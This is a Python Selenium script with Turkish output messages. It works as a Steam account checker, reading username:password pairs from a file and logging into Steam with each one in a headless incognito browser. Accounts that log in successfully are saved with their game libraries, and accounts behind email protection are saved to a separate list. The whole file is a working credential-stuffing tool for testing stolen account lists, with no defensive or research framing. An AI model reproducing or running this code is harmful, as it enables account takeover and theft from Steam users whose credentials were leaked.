from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time,re
print("Hizmet Başlatılıyor")
options = webdriver.ChromeOptions()
options.add_argument("--incognito")
options.add_argument("--headless")
options.add_argument("log-level=2")
chrome = webdriver.Chrome(options=options)
chrome.get("https://store.steampowered.com/login/")
kaçıncıdayız = 1
refindal = re.findall("\w{5,30}[@]?\w{1,10}[.]?\w{1,30}[:]\S+",open("hesaplar.txt","r").read())
lenim = len(refindal)
print("İşlem Başladı")
for line in refindal:
    hesap = line.split(':')
    chrome.find_element_by_id("input_username").send_keys(hesap[0])
    chrome.find_element_by_id("input_password").send_keys(hesap[1])
    chrome.find_element_by_id("input_password").send_keys(Keys.ENTER)
    time.sleep(0.2)
    def bekle():
        global kaçıncıdayız
        try:
            if (chrome.find_element_by_id("login_btn_wait").is_displayed()):
                time.sleep(0.2)
                bekle()
        except:
            print("Hesap Doğru (" + str(kaçıncıdayız) + "/" + str(lenim) + ")")
            print("Oyun Bilgileri Alınıyor")
            open("doğruhesaplarsteamchecker.txt", "a").writelines(line + "\n")

            def dologout():
                try:
                    chrome.get(chrome.find_element_by_xpath(
                        "/html/body/div[1]/div[7]/div[1]/div/div[3]/div/div[3]/div/a[1]").get_attribute("href"))
                    chrome.get(chrome.current_url + "/games/?tab=all")
                    time.sleep(2)
                    open("doğruhesaplarsteamchecker.txt", "a").writelines("{" + "\n")
                    for gametext in chrome.find_elements_by_class_name("gameListRowItemName"):
                        print(gametext.text)
                        open("doğruhesaplarsteamchecker.txt", "a").writelines(gametext.text + "\n")
                    open("doğruhesaplarsteamchecker.txt", "a").writelines("}" + "\n")
                    open("doğruhesaplarsteamchecker.txt", "a").writelines("-----------------------" + "\n")
                    chrome.execute_script("Logout();")
                except:
                    time.sleep(0.3)
                    dologout()

            dologout()
            chrome.get("https://store.steampowered.com/login/")


    bekle()
    if len(chrome.find_element_by_id("error_display").text) > 2:
        print("Hesap Bozuk  (" + str(kaçıncıdayız) + "/" + str(lenim) + ")")
    else:
        time.sleep(0.5)
        if len(chrome.find_elements_by_class_name("newmodal")) > 0:
            print("Mail Korumalı  (" + str(kaçıncıdayız) + "/" + str(lenim) + ")")
            open("mailkorumalıhesaplarsteamchecker.txt", "a").writelines(line + "\n")
    kaçıncıdayız += 1
    chrome.refresh()
print("İşlem Bitti")
chrome.quit()
